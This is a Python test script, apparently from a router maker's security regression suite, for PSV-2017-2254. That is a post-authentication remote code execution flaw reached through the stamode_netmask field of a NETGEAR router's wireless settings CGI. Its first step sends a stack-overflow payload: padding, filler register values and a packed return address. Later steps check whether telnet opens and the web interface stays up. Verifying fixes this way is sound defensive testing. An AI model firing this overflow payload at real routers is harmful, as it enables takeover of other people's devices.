'''[PSV-2017-2254] ost-Auth RCe via stamode_netmask on WLG_adv_tri_band2.htm '''
''' anthor Cloud 2017-12-12'''
'''v1.0 '''
from API._API import *

#def test_step_0():
    #log.info( 'step-0-0 dut loaddrfault wait 160s')
    #aploaddefault()
    #log.info( "step-0-1 AP Genie over leap done")
    #Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info("step-1 httpd shouldn't be down or DUT shouldn't be telnet")
    if console_type == 'cable':
        print 'This case NA'
    else:
        url = host + urlLogs
        token = getIDToken(url)
        Authorization = 'Basic ' + base64.b64encode(user + ':' + passwd)
        cgi = 'wlg_adv.cgi'
        payload = "1234".ljust(0x84, 'a')
        payload += 'dead' # R4
        payload += 'dead' # R5
        payload += 'dead' # R6
        payload += 'dead' # R7
        payload += 'dead' # R8
        payload += 'dead' # R9
        payload += 'dead' # R10
        payload += 'dead' # R11
        payload += struct.pack("I", 0x94dc0)
        data = {
            'Apply':'Apply',
            'enable_ap':'enable_ap',
            'enable_coexistence':'enable_coexistence',
            'frag':'2346',
            'rts':'2347',
            'enable_shortpreamble':'',
            'enable_ap_an':'w_5g_enable_ap',
            'frag_an':'2346',
            'rts_an':'2347',
            'enable_shortpreamble_an':'',
            'enable_ap_an_2':'w_5g_enable_ap',
            'frag_an_2':'2346',
            'rts_an_2':'2347',
            'enable_shortpreamble_an_2':'',
            'pin_disable':'1',
            'prevent_pin_compromise':'1',
            'pin_attack_count':'3',
            'wsc_config':'on',
            'wsc_config_an':'on',
            'wsc_config_an_2':'on',
            'enable_implicit_beamforming':'enable',
            'enable_atf':'enable',
            'enable_other_mode':'1',
            'opmode':'enable_sta_mode',
            'device_name2':'R85000',
            'SPethr1':'192',
            'SPethr2':'168',
            'SPethr3':'2',
            'SPethr4':'1',
            'SMask1':'255',
            'SMask2':'255',
            'SMask3':'255',
            'SMask4':'0',
            'SGateway1':'192',
            'SGateway2':'168',
            'SGateway3':'2',
            'SGateway4':'1',
            'SDAddr1':'8',
            'SDAddr2':'8',
            'SDAddr3':'8',
            'SDAddr4':'8',
            'SPDAddr1':'',
            'SPDAddr2':'',
            'SPDAddr3':'',
            'SPDAddr4':'',
            'sku_name':'NA',
            'wps_enable':'enabled',
            'show_wps_alert':'0',
            'wifi_2g_state':'Enable',
            'wifi_5g_state':'Enable',
            'wifi_5g_2_state':'Enable',
            'wifi_2g_sche':'',
            'wifi_2g_sche_onoff':'0',
            'wifi_5g_sche':'',
            'wifi_5g_2_sche':'',
            'wifi_5g_sche_onoff':'0',
            'wifi_5g_2_sche_onoff':'0',
            'wifi_2g_sche_num':'0',
            'wifi_5g_sche_num':'0',
            'wifi_5g_2_sche_num':'0',
            'ntp_synced_flag':'0',
            'select_2g_sche':'-1',
            'select_5g_sche':'-1',
            'select_5g_2_sche':'-1',
            'ssid_2g':'NETGEAR88',
            'ssid_5g':'NETGEAR88-5G',
            'ssid_5g_2':'NETGEAR88-5G',
            'secu_type_2g':'WPA2-PSK',
            'secu_type_5g':'WPA2-PSK',
            'secu_type_5g_2':'WPA2-PSK',
            'passphrase_2g':'wideskates103',
            'passphrase_5g':'aaaaaaa',
            'passphrase_5g_2':'aaaaaaa',
            'wifi_button_on_off':'1',
            'apmode_ipaddr':'0.0.0.0',
            'apmode_netmask':'0.0.0.0',
            'apmode_gateway':'0.0.0.0',
            'apmode_dns_sel':'',
            'apmode_dns1_pri':'0.0.0.0',
            'apmode_dns1_sec':'',
            'sta_mode':'1',
            'ap_mode':'0',
            'stamode_ipaddr':'192.168.2.1',
            'stamode_netmask':payload,
            'stamode_gateway':'192.168.2.2',
            'stamode_dns1_pri':'8.8.8.8',
            'stamode_dns1_sec':'...',
            'wifi_dual_5g_band':''
        }
        headers = {
            'Host': hostip,
            'Cache-Control': 'max-age=0',
            'Authorization': Authorization,
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
        }
        post_url = host + '%s' % cgi + token
        r = requests.post(post_url, headers=headers, data=data,timeout=5)
        log.info(r.status_code)
        post_url = host + '%s' % urlWirelessSetup
        r1 = requests.post(post_url, headers=headers,timeout=5)
        log.info(r1.status_code)

def test_Step_2():
    log.info( 'step-2 check telnet dut')
    if console_type == 'cable':
        print 'This case NA'
        str2 = 'fail'
    else:
        str2 = judjeduttelnet()    
        if str2 == 'pass':
            log.info(str2)
            log.info( "check telnet dut pass")
            time.sleep(1)
        else:
            log.info(str2)
            log.info( "check telnet dut fail")
    assert str2 == 'pass', "This action should work." 

def test_Step_3():
    log.info( 'step-3 Make sure the Web GUI should not crash')
    if console_type == 'cable':
        print 'This case NA'
        str = 'fail'
    else:
        url = "http://" + user + ':' + passwd + "@" + hostip + '/' + urlDevicecontrol
        str = check_DUTnocrash(url)
    assert str == 'pass', "This action should work." 